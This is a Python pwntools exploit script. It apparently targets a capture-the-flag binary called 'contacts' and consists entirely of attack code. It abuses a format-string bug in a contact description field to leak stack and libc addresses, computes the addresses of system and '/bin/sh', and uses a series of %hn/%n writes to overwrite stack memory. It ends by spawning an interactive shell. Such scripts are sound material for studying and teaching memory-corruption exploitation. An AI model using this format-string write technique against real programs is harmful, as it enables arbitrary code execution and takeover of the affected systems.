from pwn import *
import time

proc = process("./contacts")
print proc.recv(1024)

#This is memory leak part
proc.sendline("1")
print proc.recv(1024)
proc.sendline("leak")
print proc.recv(1024)
proc.sendline("1234")
print proc.recv(1024)
proc.sendline("4000")
print proc.recv(1024)
proc.sendline("%"+"6$p"+"%"+"31$p"+"%"+"5$p")
print proc.recv(1024)
proc.sendline("4")
tmp = proc.recv(1024).split("\n")
for i in tmp:
	if "Description:" in i:
		trash, ebp, addr, tmp3 = i.split(' ')[1].split('0x')
		
#Calculate memory.
addr = int(addr, 16)
ebp = int(ebp, 16)
print hex(ebp)
ebp = ebp&0xffff
system = addr + 141161
binsh = addr + 1323508
system_upper = (system&0xffff0000)>>16
system_lower = system&0xffff
binsh_upper = (binsh&0xffff0000)>>16
binsh_lower = binsh&0xffff

#Delete contacts which is used to leak memory
proc.sendline("2")
print proc.recv(1024)
proc.sendline("leak")
print proc.recv(1024)

#Attack
proc.sendline("1")
print proc.recv(1024)
proc.sendline("t1")
print proc.recv(1024)
proc.sendline("1234")
print proc.recv(1024)
proc.sendline("4000")
print proc.recv(1024)
proc.sendline("%"+str(ebp+52)+"c"+"%"+"6$hn")
print proc.recv(1024)

proc.sendline("1")
print proc.recv(1024)
proc.sendline("t2")
print proc.recv(1024)
proc.sendline("1234")
print proc.recv(1024)
proc.sendline("4000")
print proc.recv(1024)
proc.sendline("%"+str(system_lower)+"c"+"%"+"18$n")
print proc.recv(1024)

proc.sendline("1")
print proc.recv(1024)
proc.sendline("t3")
print proc.recv(1024)
proc.sendline("1234")
print proc.recv(1024)
proc.sendline("4000")
print proc.recv(1024)
proc.sendline("%"+str(ebp+54)+"c"+"%"+"6$hn")
print proc.recv(1024)

proc.sendline("1")
print proc.recv(1024)
proc.sendline("t4")
print proc.recv(1024)
proc.sendline("1234")
print proc.recv(1024)
proc.sendline("4000")
print proc.recv(1024)
proc.sendline("%"+str(system_upper)+"c"+"%"+"18$n")
print proc.recv(1024)

proc.sendline("1")
print proc.recv(1024)
proc.sendline("t5")
print proc.recv(1024)
proc.sendline("1234")
print proc.recv(1024)
proc.sendline("4000")
print proc.recv(1024)
proc.sendline("%"+str(ebp+60)+"c"+"%"+"6$hn")
print proc.recv(1024)

proc.sendline("1")
print proc.recv(1024)
proc.sendline("t6")
print proc.recv(1024)
proc.sendline("1234")
print proc.recv(1024)
proc.sendline("4000")
print proc.recv(1024)
proc.sendline("%"+str(binsh_lower)+"c"+"%"+"18$n")
print proc.recv(1024)

proc.sendline("1")
print proc.recv(1024)
proc.sendline("t7")
print proc.recv(1024)
proc.sendline("1234")
print proc.recv(1024)
proc.sendline("4000")
print proc.recv(1024)
proc.sendline("%"+str(ebp+62)+"c"+"%"+"6$hn")
print proc.recv(1024)

proc.sendline("1")
print proc.recv(1024)
proc.sendline("t8")
print proc.recv(1024)
proc.sendline("1234")
print proc.recv(1024)
proc.sendline("4000")
print proc.recv(1024)
proc.sendline("%"+str(binsh_upper)+"c"+"%"+"18$n")
print proc.recv(1024)

proc.sendline("1")
print proc.recv(1024)
proc.sendline("t9")
print proc.recv(1024)
proc.sendline("1234")
print proc.recv(1024)
proc.sendline("4000")
print proc.recv(1024)
proc.sendline("%"+str(ebp + 62 - 14)+"c"+"%"+"6$hn")
print proc.recv(1024)

proc.sendline("4")
print proc.recv(100000000).split('\n')[-1]
proc.sendline("5")

proc.interactive()
